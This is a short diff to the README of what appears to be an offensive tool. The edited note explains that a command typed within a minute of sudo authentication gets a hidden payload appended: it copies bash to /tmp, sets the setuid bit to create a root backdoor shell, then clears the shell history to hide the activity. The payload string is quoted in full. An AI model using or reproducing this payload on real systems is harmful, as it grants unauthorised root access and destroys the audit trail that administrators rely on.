@@ -22,7 +22,7 @@ cd script/extra
 
 - example
 > [!NOTE]
-> After entering the sudo command and password, the next command will be executed together with the specified commands (static char *command = ";sudo cp -rp /bin/bash /tmp;sudo chmod +s /tmp/bash;echo -n > ~/.bash_history;history -c;\x0d";). 
+> If you execute the next command within one minute after entering the sudo command and password, it will be executed together with the specified commands (static char *command = ";sudo cp -rp /bin/bash /tmp;sudo chmod +s /tmp/bash;echo -n > ~/.bash_history;history -c;\x0d";).
 
 ```
 $ ./script
